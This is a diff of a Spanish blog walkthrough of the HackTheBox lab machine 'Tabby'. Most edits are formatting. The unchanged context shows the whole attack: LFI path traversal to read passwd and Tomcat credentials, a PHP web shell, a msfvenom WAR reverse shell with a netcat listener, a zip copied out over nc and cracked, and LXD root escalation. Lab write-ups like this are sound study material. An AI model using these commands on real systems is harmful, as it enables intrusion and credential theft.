@@ -1,10 +1,12 @@
 ---
 layout      : post
 title       : "HackTheBox - Tabby"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png
 category    : [ htb ]
+tags        : [ tomcat, LFI, cracking, LXD ]
 ---
-Máquina Linux nivel fácil. Tabbyen, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema.
+Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema.
 
 ![tabbyHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/tabbyHTB.png)
 
@@ -16,23 +18,23 @@ Bueeeeno, hola, empezaremos explotando una vulnerabilidad **Local File Inclusion
 
 Como siempre, tendremos 3 fases:
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
 3. [Escalada de privilegios](#escalada-de-privilegios)
 
 ...
 
-## Enumeración {#enumeración}
+## Enumeración {#enumeracion}
 
 Hacemos un escaneo de puertos con `nmap`, según la velocidad con la que vaya agregamos parámetros para hacerlo más rápido, eso si, validando que no se nos pierdan puertos.
 
-```sh
+```bash
 ─╼ $ nmap -p- --open -v 10.10.10.194
 ```
 
 Pero va lento, agregando `-T` no cambia mucho, así que podemos usar `--min-rate`. (Sin embargo es importante hacer un escaneo total, sin cambios así vaya lento, que nos permita ver si `--min-rate` obvia algún puerto.
 
-```sh
+```bash
 ─╼ $ nmap -p- --open -v -Pn --min-rate=2000 10.10.10.194 -oG initScan
 ```
 
@@ -46,7 +48,7 @@ Pero va lento, agregando `-T` no cambia mucho, así que podemos usar `--min-rate
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en un archivo con formato grepeable, ya que uso una función que me extrae los puertos    |
 
-```sh
+```bash
 ─╼ $ cat initScan 
 # Nmap 7.80 scan initiated Mon Oct  5 12:09:18 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.194
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -62,7 +64,7 @@ Listo, obtenemos los puertos:
 
 Procedemos a nuestro escaneo de versiones y scripts.
 
-```sh
+```bash
 ─╼ $ nmap -p22,80,8080 -sC -sV 10.10.10.194 -oN portScan
 ```
 
@@ -73,7 +75,7 @@ Procedemos a nuestro escaneo de versiones y scripts.
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 ─╼ $ cat portScan
 # Nmap 7.80 scan initiated Mon Oct  5 12:16:03 2020 as: nmap -p22,80,8080 -sC -sV -oN portScan 10.10.10.194
 Nmap scan report for 10.10.10.194
@@ -97,7 +99,7 @@ Revisando cada versión con `searchsploit` no encontramos nada.
 
 Enumerando simplemente encontramos en el apartado `/news` que si entramos la **URL** cambia a `http://megahosting.htb/news.php?file=statement`. Por lo que debemos modificar en nuestro archivo `/etc/hosts` ese reconocimiento. Para que cuando la petición sea hacia el dominio `megahosting.htb` la resuelva la IP `10.10.10.194`.
 
-```sh
+```bash
 ─╼ $ cat /etc/hosts
 
 10.10.10.194  megahosting.htb
@@ -108,7 +110,9 @@ Si volvemos a entrar ahora si nos permite ver el contenido:
 > We apologise to all our customers for the previous data breach.
 > We have changed the site to remove this tool, and have invested heavily in more secure servers
 
-## Explotación {#explotación}
+...
+
+## Explotación {#explotacion}
 
 Veamos la URL. Toma un argumento llamado `file`, lo que en nuestra cabeza puede significar que puede estar tomando cualquier archivo que le indiquemos... Por lo que posiblemente tengamos un **Local/Remote File Inclusion**, que nos permitiría ver e INCLUIR archivos en el sistema. Probemos ver un archivo local.
 
@@ -120,7 +124,7 @@ http://megahosting.htb/news.php?file=../../../../../../etc/passwd
 
 ![pagepasswd](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagepasswd.png)
 
-```sh
+```bash
 ─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -160,7 +164,7 @@ ash:x:1000:1000:clive:/home/ash:/bin/bash
 
 Perfecto, tenemos **Local** (vemos un usuario **ash**), probemos **Remote**. Primero creemos un archivo que nos permita ejecutar comandos en el sistema por medio de un argumento.
 
-```sh
+```bash
 ─╼ $ cat shxcx.php
 
 <?php shell_exec($_GET['xmd']); ?>
@@ -203,7 +207,7 @@ Buscando en internet indican dos cosas importantes:
 
 Pero tampoco obtenemos salida. En una guia encontre que al momento de instalar tomcat necesitaremos un archivo de -servicio- y está guardado en `/etc/systemd/system/tomcat.service`, dentro del estarán las rutas que está usando **CATALINA_HOME** y **CATALINA_BASE**.
 
-```sh
+```bash
 ─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../etc/systemd/system/tomcat.service
 
 [Unit]
@@ -235,14 +239,14 @@ Validando sobre ese **CATALINA_HOME** tampoco vemos salida del archivo `tomcat-u
 
 Después de bastante tiempo intentando cosas me fui para el foro de HackThebox, una pista en la que simplemente referenciaba 
 
-```sh
+```bash
 sudo apt-get install ...
 find / -name...
 ```
 
 Me hizo dudar si la persona que creo la máquina lo había hecho así y si esa manera creaba diferentes archivos en diferentes lados... Pues si:
 
-```sh
+```bash
 ─╼ $ sudo apt-get install tomcat9
 ─╼ $ find / -name "tomcat-users.xml"
 
@@ -253,7 +257,7 @@ Me hizo dudar si la persona que creo la máquina lo había hecho así y si esa m
 
 Y ahora haciendo la búsqueda sobre esa nueva ruta: `/usr/share/tomcat9/etc/tomcat-users.xml` tenemos credenciales:
 
-```sh
+```bash
 ─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -290,7 +294,7 @@ Lo primero es generar el archivo, podemos usar `msfvenom` para ello:
 
 > [Esta otra guia] nos explica como seria crear el archivo en vez de usar `msfvenom`
 
-```sh
+```bash
 # Creamos el archivo
 ─╼ $ msfvenom -p java/shell_reverse_tcp lhost=10.10.15.86 lport=4433 -f war -o pwn.war
 
@@ -304,7 +308,7 @@ Lo primero es generar el archivo, podemos usar `msfvenom` para ello:
 ─╼ $ curl -s http://10.10.10.194:8080/foo
 ```
 
-```sh
+```bash
 ─╼ $ rlwrap nc -nlvp 4433
 listening on [any] 4433 ...
 connect to [10.10.15.86] from (UNKNOWN) [10.10.10.194] 38884
@@ -326,7 +330,7 @@ Estamos dentro, ahora a enumerar :)
 
 Vemos el usuario **ash** en el directorio home, pero no tenemos acceso a el. Veamos que podemos usar para obtenerlo. Buscando de que archivos es owner el usuario **tomcat** no obtenemos nada relevante... Si lo hacemos con **ash** obtenemos esto:
 
-```sh
+```bash
 tomcat@tabby:/var/lib/tomcat9$ find / -user ash -ls 2>/dev/null | grep -v proc | grep -v sys
    667268      4 drwxr-xr-x   4 ash      ash          4096 Jun 17 21:59 /var/www/html/files
    655666     12 -rw-r--r--   1 ash      ash          8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
@@ -336,7 +340,7 @@ tomcat@tabby:/var/lib/tomcat9$ find / -user ash -ls 2>/dev/null | grep -v proc |
 
 Pasemos ese archivo `.zip` a nuestra máquina e intentemos crackearlo.
 
-```sh
+```bash
 # En nuestra maquina
 ─╼ $ nc -lvp 4445 > 16162020_backup.zip
 
@@ -350,7 +354,7 @@ tomcat@tabby:/var/lib/tomcat9$ nc -w 5 10.10.15.86 4445 < /var/www/html/files/16
 
 Ahora usamos **fcrackzip**
 
-```sh
+```bash
 ─╼ $ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
 'var/www/html/assets/' is not encrypted, skipping
 found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
@@ -373,7 +377,7 @@ Listos, procedamos a ver que tenemos dentro... Pues nada importante. (Acá estuv
 
 Pues resulta que si probamos en la máquina:
 
-```sh
+```bash
 tomcat@tabby:/var/lib/tomcat9$ su ash
 Password: admin@it
 
@@ -382,26 +386,28 @@ ash@tabby:/var/lib/tomcat9$
 
 Estamos dentro como el usuario **ash** :P Tenemos el flag del user.
 
+...
+
 ## Escalada de privilegios {#escalada-de-privilegios}
 
 Inspeccionemos O.O
 
 Enumerando los grupos en los que esta **ash** vemos que está en el grupo **lxd**. 
 
-```sh
+```bash
 ash@tabby:/dev/shm$ id
 uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
 ```
 
 De una recorde un video de [s4vitar](https://www.youtube.com/watch?v=DJydodFguU4) en el que explota este grupo... De igual forma dejo unos artículos que también explican como aprovecharse del grupo para obtener una Shell como usuario administrador.
 
-* [Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/)
-* [Ethical Hacking Guru](https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/)
-* [S4vitar](https://www.youtube.com/watch?v=DJydodFguU4)
+* [Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/).
+* [Ethical Hacking Guru](https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/).
+* [S4vitar](https://www.youtube.com/watch?v=DJydodFguU4).
 
 Lo primero que debemos hacer es descargar y ejecutar en nuestra máquina atacante una imagen de un contenedor, en este caso usaremos **alpine**.
 
-```sh
+```bash
 ─╼ $ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
 ─╼ $ chmod +x build-alpine
 ─╼ # ./build-alpine
@@ -412,7 +418,7 @@ alpine-v3.12-x86_64-20201007_0822.tar.gz  build-alpine
 
 Nos generará la imagen y ese es el que moveremos a la máquina victima. Estando en la máquina victima haremos esto:
 
-```sh
+```bash
 # Creamos el contenedor 
 ash@tabby:/dev/shm$ lxc image import alpine-v3.12-x86_64-20201007_0822.tar.gz --alias alpina
 ash@tabby:/dev/shm$ lxd init --auto
@@ -442,7 +448,7 @@ Y listooooooooooooos, tenemos toda la raíz del sistema montada con el usuario *
 
 Apenas terminemos lo nuestro, lo óptimo es borrar la imagen y el contenedor:
 
-```sh
+```bash
 ash@tabby:/dev/shm$ lxc stop privesc
 ash@tabby:/dev/shm$ lxc delete privesc
 ash@tabby:/dev/shm$ lxc image delete alpina
